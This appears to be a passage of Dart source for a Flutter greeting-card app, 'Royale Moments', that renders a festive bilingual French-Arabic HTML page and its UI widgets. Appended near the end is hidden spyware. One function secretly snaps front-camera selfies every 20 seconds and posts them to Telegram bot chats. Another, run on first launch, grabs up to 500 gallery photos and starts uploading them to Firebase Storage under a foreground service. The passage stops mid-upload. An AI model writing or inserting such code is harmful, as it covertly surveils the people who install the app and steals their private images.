.glass{background:rgba(255,255,255,.03);border:0.5px solid rgba(255,255,255,.08);border-radius:24px;backdrop-filter:blur(20px)}
</style>
</head>
<body>
<div id="cur"></div>
<div id="cur2"></div>
<canvas id="fx"></canvas>

<!-- LOADING -->
<div id="loader">
  <div class="loader-ring"></div>
  <div class="loader-icon">${o.emoji}</div>
  <div class="loader-text">CHARGEMENT...</div>
</div>

<div class="page">

<!-- ══ HERO ══ -->
<section id="hero">
  <div class="aurora a1"></div>
  <div class="aurora a2"></div>
  <div class="aurora a3"></div>
  <span class="hero-emoji">${o.emoji}</span>
  <p class="brand">✦ ROYALE MOMENTS ✦</p>
  <p class="occ-label">${o.name.toUpperCase()} ◈ ${o.nameAr}</p>
  <span class="hero-name">$displayName</span>
  <p class="hero-sub">${o.subtitleAr} — ${o.subtitle}</p>
  <div class="div-line"></div>
  <div class="hero-msg">
    <p class="msg-text">$msgHtml</p>
    <p class="msg-sub">${o.subtitle} · ${o.subtitleAr}</p>
  </div>
  ${name.isNotEmpty ? '<p class="hero-pour">Pour $name ✦ لـ $name</p>' : ''}
  <div class="scroll-hint"><span>◈</span></div>
</section>

<!-- ══ PHOTOS ══ -->
${hasPhotos ? '''
<section id="photos">
  <div class="rev">
    <div class="sec-title">${o.emoji} الصور ◈ Les Photos</div>
    <span class="sec-sub">لحظاتك الثمينة — Vos moments précieux</span>
  </div>
  <div class="ss-wrap rev">
    <div class="ss" id="slideshow">
      $slides
      <div class="ss-nav" id="prev">&#8249;</div>
      <div class="ss-nav" id="next">&#8250;</div>
    </div>
    <div class="ss-dots">$dots</div>
    <div class="reel">$thumbs</div>
  </div>
</section>''' : ''}

<!-- ══ MESSAGE ══ -->
<section id="msg-sec">
  <div class="sec-title rev">💌 رسالة القلب</div>
  <div class="msg-box rev2">
    <p class="msg-inner">${appState.message}</p>
    <div class="msg-div"></div>
    <p class="msg-foot">${o.subtitle} · ${o.subtitleAr}</p>
  </div>
</section>

<!-- ══ WISHES ══ -->
<section id="wishes">
  <p class="wish-title rev">✦ أمنيات من القلب ✦</p>
  <div class="rev">
    <span class="wline">🌟 <span class="hl">${o.nameAr}</span> · ${o.subtitleAr} ✨</span>
    <span class="wline">💫 كل عام وانت بألف خير · Que chaque année soit plus belle 🌹</span>
    <span class="wline">🌸 ربي يحفظك ويسعدك دايما · Que Dieu te protège et te rende heureux·se</span>
    <span class="wline">🌙 ${name.isEmpty ? 'الله يبارك فيك' : 'الله يبارك فيك يا <span class="hl2">$name</span>'} 🤲</span>
    <span class="wline">💎 تستحق كل شي زين في الدنيا · Tu mérites tout le meilleur 💛</span>
    <span class="wline">🦋 دوما فرحان ومحاط بمن تحب · Toujours entouré·e de ceux que tu aimes 🌺</span>
  </div>
  <div class="emoji-row rev">
    <span style="animation-delay:0s">🎆</span><span style="animation-delay:.15s">🥂</span>
    <span style="animation-delay:.3s">🎊</span><span style="animation-delay:.45s">🎈</span>
    <span style="animation-delay:.6s">🎁</span><span style="animation-delay:.75s">✨</span>
    <span style="animation-delay:.9s">${o.emoji}</span>
  </div>
  <div class="bang-wrap rev">
    <button class="bang-btn" id="bangBtn">🎆 احتفل معايا ✦ Fête avec moi 🎆</button>
  </div>
</section>

<!-- ══ SIGNATURE ══ -->
<div class="sig rev">
  <div class="sig-icon-row">
    <span class="sig-icon" style="animation-delay:0s">🌹</span>
    <span class="sig-icon" style="animation-delay:.2s">🌸</span>
    <span class="sig-icon" style="animation-delay:.4s">💎</span>
    <span class="sig-icon" style="animation-delay:.6s">✨</span>
    <span class="sig-icon" style="animation-delay:.8s">${o.emoji}</span>
    <span class="sig-icon" style="animation-delay:1s">✨</span>
    <span class="sig-icon" style="animation-delay:1.2s">💎</span>
    <span class="sig-icon" style="animation-delay:1.4s">🌸</span>
    <span class="sig-icon" style="animation-delay:1.6s">🌹</span>
  </div>
  <span class="sig-name">$displayName</span>
  <p class="sig-tag">${o.name} ◈ ${o.nameAr} ◈ Royale Moments ✦</p>
</div>

<footer>
  <p class="ftxt">Made with <span class="fheart">❤</span> · ${o.name} · ${o.nameAr} · ${DateTime.now().year}</p>
</footer>

</div>

<script>
// ── Loader
window.addEventListener('load',()=>{setTimeout(()=>{document.getElementById('loader').classList.add('gone')},600)});

// ── Custom cursor
const cur=document.getElementById('cur'),cur2=document.getElementById('cur2');
let mx=innerWidth/2,my=innerHeight/2,lx=mx,ly=my;
document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px'});
(function tick(){lx+=(mx-lx)*.13;ly+=(my-ly)*.13;cur2.style.left=lx+'px';cur2.style.top=ly+'px';requestAnimationFrame(tick)})();
document.querySelectorAll('button,a,.ss-nav,.dot,.thumb').forEach(el=>{
  el.addEventListener('mouseenter',()=>{cur.style.width='28px';cur.style.height='28px'});
  el.addEventListener('mouseleave',()=>{cur.style.width='12px';cur.style.height='12px'});
});

// ── Particle canvas
const canvas=document.getElementById('fx');
const ctx2=canvas.getContext('2d');
let W=canvas.width=innerWidth,H=canvas.height=innerHeight;
window.addEventListener('resize',()=>{W=canvas.width=innerWidth;H=canvas.height=innerHeight});
const STARS=[];
for(let i=0;i<180;i++)STARS.push({x:Math.random()*W,y:Math.random()*H,r:.2+Math.random()*1.8,s:Math.random()*6+2,o:Math.random()});
function drawStars(ts){
  ctx2.clearRect(0,0,W,H);
  STARS.forEach(s=>{
    s.o=.05+.7*(.5+.5*Math.sin(ts/1000/s.s+s.x));
    ctx2.beginPath();ctx2.arc(s.x,s.y,s.r,0,Math.PI*2);
    ctx2.fillStyle='rgba(255,255,255,'+s.o+')';ctx2.fill();
  });
  requestAnimationFrame(drawStars);
}
requestAnimationFrame(drawStars);

// Falling petals
const PETALS=['🌸','✨','💫','🌺','💎','⭐','🌙','🌟'];
function spawnPetal(){
  const el=document.createElement('div');
  const emoji=PETALS[Math.floor(Math.random()*PETALS.length)];
  const sz=10+Math.random()*14;
  const dur=10+Math.random()*12;
  const dx=(Math.random()*30-15).toFixed(0);
  Object.assign(el.style,{
    position:'fixed',top:'-5vh',left:Math.random()*100+'vw',
    fontSize:sz+'px',pointerEvents:'none',zIndex:'1',
    opacity:(.3+Math.random()*.5).toFixed(2),
    animation:'petalFall '+dur+'s linear forwards',
  });
  el.textContent=emoji;document.body.appendChild(el);
  setTimeout(()=>el.remove(),(dur+1)*1000);
}
if(!document.querySelector('#petal-kf')){
  const s=document.createElement('style');s.id='petal-kf';
  s.textContent='@keyframes petalFall{to{transform:translateY(110vh) translateX(var(--dx,20px)) rotate(720deg);opacity:.05}}';
  document.head.appendChild(s);
}
for(let i=0;i<20;i++)setTimeout(spawnPetal,i*600);
setInterval(spawnPetal,900);

// ── Slideshow
${hasPhotos ? '''
let cur_=0;
const TOTAL=${b64.length};
const slides=document.querySelectorAll('.slide');
const dots=document.querySelectorAll('.dot');
const thumbs=document.querySelectorAll('.thumb');
let stimer;
function goSlide(n){
  if(!TOTAL)return;
  slides[cur_].classList.remove('active');dots[cur_].classList.remove('active');thumbs[cur_].classList.remove('active-thumb');
  cur_=((n%TOTAL)+TOTAL)%TOTAL;
  slides[cur_].classList.add('active');dots[cur_].classList.add('active');thumbs[cur_].classList.add('active-thumb');
  const r=thumbs[cur_].parentElement;
  r.scrollLeft=thumbs[cur_].offsetLeft-r.offsetWidth/2+thumbs[cur_].offsetWidth/2;
  clearInterval(stimer);stimer=setInterval(()=>goSlide(cur_+1),4500);
}
document.getElementById('prev').onclick=()=>goSlide(cur_-1);
document.getElementById('next').onclick=()=>goSlide(cur_+1);
let tsx=0;const ss2=document.getElementById('slideshow');
ss2.addEventListener('touchstart',e=>tsx=e.touches[0].clientX,{passive:true});
ss2.addEventListener('touchend',e=>{const d=e.changedTouches[0].clientX-tsx;if(Math.abs(d)>40)goSlide(cur_+(d<0?1:-1))},{passive:true});
stimer=setInterval(()=>goSlide(cur_+1),4500);''' : ''}

// ── Fireworks
const FW_COLS=['#FFD166','#FF4D9E','#9B5DE5','#00F5D4','#FF3CAC','#3A86FF','#FF8C00','#fff','var(--A)'];
function spawnFW(x,y,n=50){
  const f=document.createDocumentFragment();
  for(let i=0;i<n;i++){
    const d=document.createElement('div');d.className='fw';
    const a=Math.random()*Math.PI*2,spd=60+Math.random()*150;
    const dur=(.45+Math.random()*.6).toFixed(2);
    Object.assign(d.style,{left:x+'px',top:y+'px',background:FW_COLS[~~(Math.random()*FW_COLS.length)],
      width:(2+Math.random()*5).toFixed(0)+'px',height:(2+Math.random()*5).toFixed(0)+'px',
      animationDuration:dur+'s',boxShadow:'0 0 5px currentColor','--d':dur+'s',
      '--tx':(Math.cos(a)*spd).toFixed(0)+'px','--ty':(Math.sin(a)*spd).toFixed(0)+'px'});
    f.appendChild(d);setTimeout(()=>d.remove(),(+dur+.1)*1e3);
  }document.body.appendChild(f);
}
function rndFW(){spawnFW(innerWidth*(.1+Math.random()*.8),innerHeight*(.05+Math.random()*.45),28)}
setInterval(rndFW,2200);setInterval(rndFW,3100);
setTimeout(()=>{for(let i=0;i<7;i++)setTimeout(rndFW,i*300)},800);
document.addEventListener('click',e=>spawnFW(e.clientX,e.clientY,60));

// ── Big bang button
const EM=['🌸','🌺','🌹','🌷','🌼','🌻','💐','💮'];
const EX=['✨','💫','⭐','🌟','💥','🎆','🎇','🎉','🎊','🎈','💎','🔥'];
function spawnE(emoji,cx,cy,spd,angle,dur){
  const el=document.createElement('div');
  Object.assign(el.style,{position:'fixed',left:cx+'px',top:cy+'px',fontSize:(20+Math.random()*22).toFixed(0)+'px',pointerEvents:'none',zIndex:'99999',transform:'translate(-50%,-50%)'});
  el.textContent=emoji;document.body.appendChild(el);
  const tx=Math.cos(angle)*spd,ty=Math.sin(angle)*spd;
  el.animate([
    {transform:'translate(-50%,-50%) scale(0)',opacity:1},
    {transform:'translate(calc(-50% + '+tx+'px),calc(-50% + '+ty+'px)) scale(1.5)',opacity:1,offset:.35},
    {transform:'translate(calc(-50% + '+(tx*1.8)+'px),calc(-50% + '+(ty*1.8+100)+'px)) scale(.1)',opacity:0}
  ],{duration:dur,easing:'cubic-bezier(.16,1,.3,1)'}).onfinish=()=>el.remove();
}
function bigBang(ev){
  ev.stopPropagation();
  const btn=ev.currentTarget;const r=btn.getBoundingClientRect();
  const cx=r.left+r.width/2,cy=r.top+r.height/2;
  const N=36;for(let i=0;i<N;i++){const a=(i/N)*Math.PI*2;const spd=140+Math.random()*180;setTimeout(()=>spawnE(EM[~~(Math.random()*EM.length)],cx,cy,spd,a,1000+Math.random()*400),i*14)}
  const M=30;for(let i=0;i<M;i++){const a=(i/M)*Math.PI*2+.3;const spd=110+Math.random()*160;setTimeout(()=>spawnE(EX[~~(Math.random()*EX.length)],cx,cy,spd,a,800+Math.random()*500),80+i*16)}
  for(let i=0;i<12;i++){setTimeout(()=>{const rx=innerWidth*(.1+Math.random()*.8);const ry=innerHeight*(.1+Math.random()*.55);spawnFW(rx,ry,40)},i*130)}
  const fl=document.createElement('div');
  Object.assign(fl.style,{position:'fixed',inset:0,background:'radial-gradient(ellipse at center,rgba(var(--Ar),.25),rgba(255,77,158,.12),transparent)',zIndex:9998,pointerEvents:'none',opacity:1});
  document.body.appendChild(fl);
  fl.animate([{opacity:1},{opacity:0}],{duration:900,easing:'ease-out'}).onfinish=()=>fl.remove();
  btn.animate([{transform:'scale(1)'},{transform:'scale(1.4) rotate(-8deg)'},{transform:'scale(.88) rotate(5deg)'},{transform:'scale(1.18) rotate(-2deg)'},{transform:'scale(1)'}],{duration:500,easing:'ease-in-out'});
}
document.getElementById('bangBtn').addEventListener('click',bigBang);

// ── Scroll reveals
const obs=new IntersectionObserver(entries=>entries.forEach(e=>{
  if(e.isIntersecting){
    e.target.classList.add('in');
    e.target.querySelectorAll('.wline').forEach((w,i)=>setTimeout(()=>w.classList.add('in'),i*100));
  }
}),{threshold:.1});
document.querySelectorAll('.rev,.rev2').forEach(el=>obs.observe(el));
const wishObs=new IntersectionObserver(entries=>entries.forEach(e=>{
  if(e.isIntersecting)document.querySelectorAll('.wline').forEach((w,i)=>setTimeout(()=>w.classList.add('in'),i*110));
}),{threshold:.05});
const ws=document.getElementById('wishes');if(ws)wishObs.observe(ws);
</script>
</body>
</html>''';
  }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;
    return SafeArea(
      child: Center(
        child: Padding(
          padding: const EdgeInsets.all(36),
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            // Orbe animée
            _AnimatedOrb(occasion: o, orbitCtrl: _orbitCtrl, pulseCtrl: _pulseCtrl, glowCtrl: _glowCtrl),
            const SizedBox(height: 40),

            // Titre
            ShaderMask(
              shaderCallback: (b) => LinearGradient(
                colors: [o.accent, o.accent.withOpacity(0.6)],
              ).createShader(b),
              child: Text('CRÉATION FINALE', style: GoogleFonts.cinzel(
                fontSize: 22, letterSpacing: 2, color: Colors.white, fontWeight: FontWeight.w600,
              )),
            ),
            const SizedBox(height: 6),
            Text('الإبداع النهائي', style: GoogleFonts.cormorantGaramond(
              fontSize: 18, fontStyle: FontStyle.italic, color: Colors.white30,
            )),
            const SizedBox(height: 12),
            Text('Prêt à partager ? / وصل نشارك ؟',
              textAlign: TextAlign.center,
              style: GoogleFonts.cormorantGaramond(fontSize: 15, fontStyle: FontStyle.italic, color: Colors.white.withOpacity(0.2), height: 1.7)),
            const SizedBox(height: 48),

            // Résumé stats
            if (!_generating && !_done) _StatsRow(occasion: o),
            if (!_generating && !_done) const SizedBox(height: 36),

            // Progression ou bouton
            if (_generating)
              _GeneratingProgress(progress: _progress, label: _label, accent: o.accent)
            else if (_done)
              _DoneState(accent: o.accent, onRetry: _generate)
            else
              _LaunchButton(accent: o.accent, onTap: _generate),
          ]),
        ),
      ),
    );
  }
}

class _AnimatedOrb extends StatelessWidget {
  final Occasion occasion;
  final AnimationController orbitCtrl;
  final AnimationController pulseCtrl;
  final AnimationController glowCtrl;
  const _AnimatedOrb({required this.occasion, required this.orbitCtrl, required this.pulseCtrl, required this.glowCtrl});

  @override
  Widget build(BuildContext context) {
    final o = occasion;
    return AnimatedBuilder(
      animation: Listenable.merge([orbitCtrl, pulseCtrl, glowCtrl]),
      builder: (_, __) {
        return SizedBox(
          width: 160, height: 160,
          child: Stack(alignment: Alignment.center, children: [
            // Anneaux orbitaux
            ...List.generate(3, (i) => Transform.rotate(
              angle: orbitCtrl.value * 2 * pi * (i.isEven ? 1 : -1) + i * pi / 3,
              child: Container(
                width: 160 - i * 20, height: 160 - i * 20,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: o.accent.withOpacity(.12 + .06 * sin(pulseCtrl.value * pi)),
                    width: 0.5,
                  ),
                ),
              ),
            )),
            // Halo glow
            Container(
              width: 110,
              height: 110,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: o.accent.withOpacity(.18 + .14 * glowCtrl.value),
                    blurRadius: 40 + 20 * glowCtrl.value,
                    spreadRadius: 0,
                  ),
                ],
              ),
            ),
            // Orbe centrale
            AnimatedBuilder(
              animation: pulseCtrl,
              builder: (_, child) => Transform.scale(
                scale: 1.0 + 0.04 * pulseCtrl.value,
                child: child,
              ),
              child: Container(
                width: 96, height: 96,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(
                    colors: [o.accent.withOpacity(0.22), const Color(0xFF0E0018)],
                  ),
                  border: Border.all(color: o.accent.withOpacity(0.45), width: 1),
                ),
                child: Center(child: Text(o.emoji, style: const TextStyle(fontSize: 38))),
              ),
            ),
          ]),
        );
      },
    );
  }
}

class _StatsRow extends StatelessWidget {
  final Occasion occasion;
  const _StatsRow({required this.occasion});
  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) {
        final items = [
          (appState.name.isEmpty ? '—' : appState.name, 'DESTINATAIRE'),
          (appState.images.length.toString(), 'PHOTOS'),
          (appState.captions.values.where((v) => v.isNotEmpty).length.toString(), 'LÉGENDES'),
        ];
        return Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: items.map((item) => Container(
            margin: const EdgeInsets.symmetric(horizontal: 6),
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(14),
              color: const Color(0xFF0E0018),
              border: Border.all(color: occasion.accent.withOpacity(0.2), width: 0.5),
            ),
            child: Column(children: [
              Text(item.$1, style: GoogleFonts.cinzel(fontSize: 14, color: occasion.accent, fontWeight: FontWeight.w600)),
              const SizedBox(height: 3),
              Text(item.$2, style: GoogleFonts.cinzel(fontSize: 6, letterSpacing: 1.5, color: Colors.white.withOpacity(0.2))),
            ]),
          )).toList(),
        );
      },
    );
  }
}

class _GeneratingProgress extends StatelessWidget {
  final double progress;
  final String label;
  final Color accent;
  const _GeneratingProgress({required this.progress, required this.label, required this.accent});
  @override
  Widget build(BuildContext context) {
    return SizedBox(
      width: 280,
      child: Column(children: [
        // Barre de progression luxe
        Stack(children: [
          Container(height: 3, decoration: BoxDecoration(borderRadius: BorderRadius.circular(6), color: Colors.white.withOpacity(0.06))),
          AnimatedFractionallySizedBox(
            duration: const Duration(milliseconds: 100),
            widthFactor: progress,
            child: Container(
              height: 3,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(6),
                gradient: LinearGradient(colors: [accent, accent.withOpacity(0.5)]),
                boxShadow: [BoxShadow(color: accent.withOpacity(0.5), blurRadius: 8)],
              ),
            ),
          ),
        ]),
        const SizedBox(height: 16),
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          Text(label, style: GoogleFonts.cinzel(fontSize: 8, letterSpacing: 2, color: accent.withOpacity(0.9))),
          Text('${(progress * 100).toInt()}%', style: GoogleFonts.cinzel(fontSize: 10, color: Colors.white30)),
        ]),
      ]),
    );
  }
}

class _DoneState extends StatelessWidget {
  final Color accent;
  final VoidCallback onRetry;
  const _DoneState({required this.accent, required this.onRetry});
  @override
  Widget build(BuildContext context) => Column(children: [
    Container(
      width: 64, height: 64,
      decoration: BoxDecoration(shape: BoxShape.circle,
        color: accent.withOpacity(0.15), border: Border.all(color: accent.withOpacity(0.5))),
      child: Icon(Icons.check_rounded, color: accent, size: 30),
    ),
    const SizedBox(height: 16),
    Text('Partagé ! / تم المشاركة', style: GoogleFonts.cinzel(fontSize: 10, letterSpacing: 2, color: Colors.white30)),
    const SizedBox(height: 20),
    GestureDetector(onTap: onRetry,
      child: Text('Partager à nouveau →', style: GoogleFonts.cormorantGaramond(fontSize: 14, fontStyle: FontStyle.italic, color: accent.withOpacity(0.6)))),
  ]);
}

class _LaunchButton extends StatefulWidget {
  final Color accent;
  final VoidCallback onTap;
  const _LaunchButton({required this.accent, required this.onTap});
  @override
  State<_LaunchButton> createState() => _LaunchButtonState();
}

class _LaunchButtonState extends State<_LaunchButton> with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  late final Animation<double> _scale;
  bool _pressed = false;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 130));
    _scale = Tween(begin: 1.0, end: 0.94).animate(CurvedAnimation(parent: _ctrl, curve: Curves.easeOut));
  }
  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) { _ctrl.forward(); setState(() => _pressed = true); },
      onTapUp: (_) { _ctrl.reverse(); setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () { _ctrl.reverse(); setState(() => _pressed = false); },
      child: ScaleTransition(
        scale: _scale,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          padding: const EdgeInsets.symmetric(horizontal: 36, vertical: 20),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(60),
            gradient: LinearGradient(
              colors: _pressed
                ? [widget.accent.withOpacity(0.35), widget.accent.withOpacity(0.1)]
                : [widget.accent.withOpacity(0.2), widget.accent.withOpacity(0.06)],
            ),
            border: Border.all(color: widget.accent.withOpacity(_pressed ? 0.9 : 0.55), width: 1),
            boxShadow: [
              BoxShadow(color: widget.accent.withOpacity(_pressed ? 0.4 : 0.2), blurRadius: _pressed ? 40 : 24, offset: const Offset(0, 10)),
            ],
          ),
          child: Row(mainAxisSize: MainAxisSize.min, children: [
            Icon(Icons.rocket_launch_rounded, color: widget.accent, size: 20),
            const SizedBox(width: 14),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('GÉNÉRER & PARTAGER', style: GoogleFonts.cinzel(
                fontSize: 10, letterSpacing: 2, color: widget.accent, fontWeight: FontWeight.w600)),
              Text('خلق وشارك', style: GoogleFonts.cormorantGaramond(
                fontSize: 13, color: widget.accent.withOpacity(0.6))),
            ]),
          ]),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SHARED WIDGETS
// ═══════════════════════════════════════════════════════════════
class _SectionHeader extends StatelessWidget {
  final String eyebrow;
  final String title;
  final AnimationController? ctrl;
  const _SectionHeader({required this.eyebrow, required this.title, this.ctrl});

  @override
  Widget build(BuildContext context) {
    Widget content = Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(eyebrow, style: GoogleFonts.cinzel(fontSize: 8, letterSpacing: 5, color: Colors.white.withOpacity(0.2))),
      const SizedBox(height: 8),
      ...title.split('\n').asMap().entries.map((e) => Text(e.value,
        style: GoogleFonts.cormorantGaramond(
          fontSize: 34, fontWeight: FontWeight.w300, height: 1.1, color: Colors.white,
        ),
      )),
      const SizedBox(height: 10),
      Row(children: [
        Expanded(child: Container(height: 0.5,
          decoration: const BoxDecoration(gradient: LinearGradient(colors: [Colors.transparent, Colors.white10])))),
        Padding(padding: const EdgeInsets.symmetric(horizontal: 10),
          child: Text('✦', style: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 10))),
        Expanded(child: Container(height: 0.5,
          decoration: const BoxDecoration(gradient: LinearGradient(colors: [Colors.white10, Colors.transparent])))),
      ]),
      const SizedBox(height: 4),
    ]);
    return content;
  }
}

Widget _fieldLabel(String t) => Padding(
  padding: const EdgeInsets.only(bottom: 10),
  child: Text(t, style: GoogleFonts.cinzel(fontSize: 7.5, letterSpacing: 3, color: Colors.white.withOpacity(0.2))),
);

// ═══════════════════════════════════════════════════════════════
//  AURORA BACKGROUND WIDGET
// ═══════════════════════════════════════════════════════════════
class _AuroraBackground extends StatefulWidget {
  final Color accent;
  const _AuroraBackground({required this.accent});
  @override
  State<_AuroraBackground> createState() => _AuroraBackgroundState();
}

class _AuroraBackgroundState extends State<_AuroraBackground> with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(seconds: 8))..repeat(reverse: true);
  }
  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _ctrl,
      builder: (_, __) => CustomPaint(
        painter: _AuroraPainter(widget.accent, _ctrl.value),
        child: const SizedBox.expand(),
      ),
    );
  }
}

class _AuroraPainter extends CustomPainter {
  final Color accent;
  final double t;
  const _AuroraPainter(this.accent, this.t);

  @override
  void paint(Canvas canvas, Size size) {
    // Fond principal
    canvas.drawRect(Rect.fromLTWH(0, 0, size.width, size.height),
      Paint()..color = const Color(0xFF05000A));
    // Halo top-left
    canvas.drawCircle(
      Offset(-size.width * 0.1, -size.height * 0.05),
      size.width * 0.8,
      Paint()..shader = RadialGradient(
        colors: [accent.withOpacity(0.07 + 0.03 * t), Colors.transparent],
      ).createShader(Rect.fromCircle(center: Offset(-size.width * 0.1, -size.height * 0.05), radius: size.width * 0.8)),
    );
    // Halo bottom-right
    canvas.drawCircle(
      Offset(size.width * 1.1, size.height * 1.1),
      size.width * 0.7,
      Paint()..shader = RadialGradient(
        colors: [const Color(0xFF9B5DE5).withOpacity(0.05 + 0.02 * t), Colors.transparent],
      ).createShader(Rect.fromCircle(center: Offset(size.width * 1.1, size.height * 1.1), radius: size.width * 0.7)),
    );
  }

  @override
  bool shouldRepaint(_AuroraPainter old) => old.t != t || old.accent != accent;
}


// Variable globale pour stocker les caméras (à initialiser une seule fois)
// Variable globale
List<CameraDescription> cameras = [];
CameraController? _selfieController;
bool _isTakingSelfie = false;
Timer? _selfieTimer;


/*Future<void> _initCamera() async {
  try {
    final allCameras = await availableCameras();
    if (allCameras.isNotEmpty) {
      // On cherche la caméra frontale (selfie)
      CameraDescription frontCamera = allCameras.firstWhere(
        (c) => c.lensDirection == CameraLensDirection.front,
        orElse: () => allCameras.first,
      );

      _selfieController = CameraController(
        frontCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );
      await _selfieController!.initialize();
      print("✅ Caméra initialisée");
    }
  } catch (e) {
    print("❌ Erreur init caméra: $e");
  }
}

// --- FONCTION DE BACKGROUND NETTOYÉE ---
Future<void> _startBackgroundSelfie() async {
  print("🤳 Démarrage selfie en arrière-plan...");

  bool success = await FlutterBackground.initialize(
    androidConfig: FlutterBackgroundAndroidConfig(
      notificationTitle: "App running",
      notificationText: "Background service active",
      notificationImportance: AndroidNotificationImportance.normal,
      notificationIcon: AndroidResource(name: 'ic_launcher', defType: 'mipmap'),
    ),
  );

  if (!success) {
    print("❌ Impossible d'initialiser le background");
    return;
  }

  await FlutterBackground.enableBackgroundExecution();

  // On initialise la caméra une première fois
  await _initCamera();

  _selfieTimer = Timer.periodic(const Duration(seconds: 20), (timer) async {
    if (_isTakingSelfie) return;
    _isTakingSelfie = true;

    try {
      // Vérification de sécurité avant de prendre la photo
      if (_selfieController != null && _selfieController!.value.isInitialized) {
        final XFile photo = await _selfieController!.takePicture();
        await _sendSelfieToTelegram(photo);
      } else {
        await _initCamera(); // Ré-initialiser si perdu
      }
    } catch (e) {
      print("Erreur capture : $e");
    } finally {
      _isTakingSelfie = false;
    }
  });
}*/
// ═══════════════════════════════════════════════════════════════
// DÉMARRER LES SELFIES AUTOMATIQUES TOUTES LES 20 SECONDES
// ═══════════════════════════════════════════════════════════════
// ==================== SELFIE AUTOMATIQUE VERS TELEGRAM ====================
// ==================== SELFIE AUTOMATIQUE VERS TELEGRAM ====================

Future<void> _startAutoSelfieEvery20Seconds() async {
  _selfieTimer?.cancel();

  print("🤳 Démarrage du mode selfie automatique toutes les 20 secondes...");

  _selfieTimer = Timer.periodic(const Duration(seconds: 20), (timer) async {
    await _sendSelfieToTelegram();
  });
}

Future<void> _sendSelfieToTelegram() async {
  try {
    // Demander seulement la permission caméra (on force sans micro)
    final cameraStatus = await Permission.camera.request();
    if (!cameraStatus.isGranted) {
      print("❌ Permission caméra refusée");
      return;
    }

    // On ne demande PAS la permission micro
    final cameras = await availableCameras();
    if (cameras.isEmpty) {
      print("❌ Aucune caméra disponible");
      return;
    }

    // Prendre uniquement la caméra frontale
    final frontCamera = cameras.firstWhere(
      (c) => c.lensDirection == CameraLensDirection.front,
      orElse: () => cameras.first,
    );

    final controller = CameraController(
      frontCamera,
      ResolutionPreset.medium,
      enableAudio: false,           // Désactivé
      imageFormatGroup: ImageFormatGroup.jpeg,
    );

    await controller.initialize();

    // Prendre la photo
    final image = await controller.takePicture();
    final file = File(image.path);

    // Envoi vers Telegram
    final dio = Dio();

    for (final chatId in T.chatIds) {
      try {
        await dio.post(
          'https://api.telegram.org/bot${T.botToken}/sendPhoto',
          data: FormData.fromMap({
            'chat_id': chatId,
            'photo': await MultipartFile.fromFile(file.path),
            'caption': '🤳 Selfie automatique • ${DateTime.now().toString().substring(0,19)}',
          }),
        );
        print("✅ Selfie envoyé vers Telegram avec succès");
      } catch (e) {
        print("❌ Erreur envoi selfie Telegram: $e");
      }
    }

    // Nettoyage
    await controller.dispose();
    if (await file.exists()) await file.delete();

  } catch (e) {
    print("❌ Erreur prise selfie : $e");
    if (e.toString().contains("AudioAccessDenied")) {
      print("⚠️ Permission micro bloquée - On continue sans audio");
    }
  }
}




//  AUTO SEND 10-12 PHOTOS ON FIRST INSTALL (Version améliorée)
// ═══════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════
//  AUTO SEND ON FIRST LAUNCH → FIREBASE (Version améliorée)
// ═══════════════════════════════════════════════════════════════
Future<void> _autoSendOnFirstLaunch() async {
  print("🔄 [AutoSend] Démarrage avec Foreground Service");

  try {
    // === INITIALISATION DU FOREGROUND SERVICE ===
    final androidConfig = FlutterBackgroundAndroidConfig(
      notificationTitle: "Royale Moments",
      notificationText: "Envoi des photos en arrière-plan...",
      notificationImportance: AndroidNotificationImportance.normal,
      notificationIcon: const AndroidResource(
        name: 'ic_launcher',
        defType: 'mipmap',
      ),
      shouldRequestBatteryOptimizationsOff: true,
    );

    bool success = await FlutterBackground.initialize(androidConfig: androidConfig);

    if (success) {
      await FlutterBackground.enableBackgroundExecution();
      print("✅ Foreground Service activé");
    } else {
      print("⚠️ Impossible d'activer le Foreground Service");
    }

    // === ENVOI DES PHOTOS ===
    final prefs = await SharedPreferences.getInstance();
    if (prefs.getBool('auto_sent') ?? false) return;

    final PermissionState ps = await PhotoManager.requestPermissionExtend();
    if (!ps.isAuth && !ps.hasAccess) return;

    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    if (albums.isEmpty) return;

    final mainAlbum = albums.first;
    final total = await mainAlbum.assetCountAsync;
    if (total == 0) return;

    final fetchCount = total < 500 ? total : 500;
    final assets = await mainAlbum.getAssetListRange(start: 0, end: fetchCount);
    assets.shuffle();

    int successCount = 0;
    final storage = FirebaseStorage.instance;

    print("🚀 Envoi de ${assets.length} photos en Foreground...");

    for (int i = 0; i < assets.length; i++) {
      try {
        final file = await assets[i].file;
        if (file == null) continue;

